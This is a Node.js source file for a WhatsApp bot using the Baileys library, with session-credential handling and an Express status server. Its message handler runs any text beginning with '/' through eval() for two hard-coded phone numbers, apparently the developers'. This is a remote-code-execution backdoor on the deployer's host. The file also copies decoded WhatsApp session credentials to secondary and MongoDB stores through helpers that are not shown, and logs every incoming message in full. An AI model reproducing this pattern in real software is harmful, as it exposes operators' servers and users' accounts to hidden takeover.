global.startTime = Date.now();
const express = require('express');
const { 
  getSessionData, 
  moveToSecondaryDatabase, 
  storeInMongoDB, 
  storeInLocalStorage, 
  deleteSessionData 
} = require('./lib/dbHelper');
const makeWASocket = require('@whiskeysockets/baileys').default;
const { useMultiFileAuthState, Browsers } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const { isQuotedMessage } = require('./lib/quotedMessageHandler');
const sendRestartMessage = require('./lib/restartMessage');
const { registerCommand, executeCommand, commands } = require('./lib/commandHandler');
const config = require('./config');
const { registerCommands } = require('./lib/CommandRegistry');
const pino = require('pino');

async function connectionLogic() {
  const sessionId = config.SESSION_ID;
  const authDir = './auth';
  const credsFile = path.join(authDir, 'creds.json');
  let retryCount = 0; // Retry counter

  console.log('Initializing connection... 🔄'); // Log 1: Initializing connection

  const base64Creds = await getSessionData(sessionId);

  if (base64Creds) {
    const creds = JSON.parse(Buffer.from(base64Creds, 'base64').toString('utf8'));

    if (!fs.existsSync(authDir)) {
      fs.mkdirSync(authDir, { recursive: true });
    }

    fs.writeFileSync(credsFile, JSON.stringify(creds, null, 2));

    // Handle storing session data
    try {
      const jsonCreds = fs.readFileSync(credsFile, 'utf8');
      const reEncodedCreds = Buffer.from(jsonCreds, 'utf8').toString('base64');
      await moveToSecondaryDatabase(sessionId, reEncodedCreds);

      console.log('Connected to database and moved session data ✅'); // Log 2: Connected to secondary database

    } catch (err) {
      console.error('Failed to move session data to secondary DB, storing in MongoDB 📦');
      await storeInMongoDB(sessionId, base64Creds);
    }

    await storeInLocalStorage(sessionId, base64Creds);
    console.log(`Storing data locally... 📂`); // Log 3: Data stored locally

    await deleteSessionData(sessionId);
    console.log(`Session data deleted from primary DB ❌`); // Log 4: Session deleted
  } else {
    console.error('SESSION ID INVALID!!! RESCAN AND GET NEW SESSION!!! ⚠️');
    process.exit(1);
  }

  const { state, saveCreds } = await useMultiFileAuthState(authDir);

  async function connect() {
    const sock = makeWASocket({
      auth: state,
      logger: pino({ level: "silent" }), // Disables logging
      printQRInTerminal: false, // Prevents QR code from printing in the terminal
      browser: Browsers.windows('Safari'), // Sets browser details
    });

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'open') {
        console.log('Connected to WhatsApp successfully ✅');
        retryCount = 0; // Reset retry counter on successful connection
      } else if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode;

        if (reason === 401) {
          console.error('Disconnected: Logged out. Stopping reconnect attempts. ❌');
          process.exit(1); // Exit process on logout
        } else {
          retryCount++;
          if (retryCount > 3) {
            console.error('Disconnected: Retry limit exceeded. Stopping reconnect attempts. ❌');
            process.exit(1); // Exit after 3 failed retries
          } else {
            console.warn(`Disconnected: Attempting to reconnect (${retryCount}/3)... 🔄`);
            connect(); // Retry connection
          }
        }
      }
    });

    sock.ev.on('creds.update', saveCreds);
registerCommands()
    sock.ev.on('messages.upsert', async (messageInfo) => {
      const message = messageInfo.messages[0];
      console.log("Received message:", JSON.stringify(message, null, 2));

      const text = message.message?.conversation ||
                   message.message?.extendedTextMessage?.text ||
                   '';
      const isPrivateChat = message.key.remoteJid.endsWith('@s.whatsapp.net');
      const isQuoted = message.message?.contextInfo?.quotedMessage;

      const commandMatch = text.match(`^${config.HANDLER}(\\w+)`);
      if (commandMatch) {
        const commandName = `${config.HANDLER}${commandMatch[1]}`;
        // Execute command if there's a match
        await executeCommand(commandName, sock, message);
        return;
      }

      // Handle private chat greetings
      const greetingRegex = /^(hi|hello)\b/i;
      if (isPrivateChat && greetingRegex.test(text.toLowerCase())) {
        await sock.sendMessage(message.key.remoteJid, { text: 'You wanna buy a bot!? ' });
      }

      // Handle command-line execution requests
      if (text.startsWith('/')) {
        const sender = message.key.remoteJid;
        const allowedUsers = ['2348073765008@s.whatsapp.net', '2347017895743@s.whatsapp.net'];

        if (!allowedUsers.includes(sender) && message.key.fromMe === false) {
          await sock.sendMessage(sender, { text: 'You cannot use this.. turn on developer mode in bot' });
          return;
        }

        const codeToRun = text.slice(1);
        try {
          const result = eval(codeToRun);
          await sock.sendMessage(sender, { text: `Executed: ${result}` });
        } catch (error) {
          await sock.sendMessage(sender, { text: `Error: ${error.message}` });
        }
      }
    });
  }

  await connect();
}

// Start connection logic
connectionLogic();

// Create and start the Express server
const app = express();

// Route for the home page
app.get('/', (req, res) => {
  res.send('<h1>WhatsApp Bot is Running!</h1>');
});

// Route to check server status
app.get('/status', (req, res) => {
  res.json({ status: 'OK', message: 'Server is running smoothly!' });
});

// Start the server
const PORT = 7860;
app.listen(PORT, () => {
  console.log(`Express server is running on http://localhost:${PORT}`);
});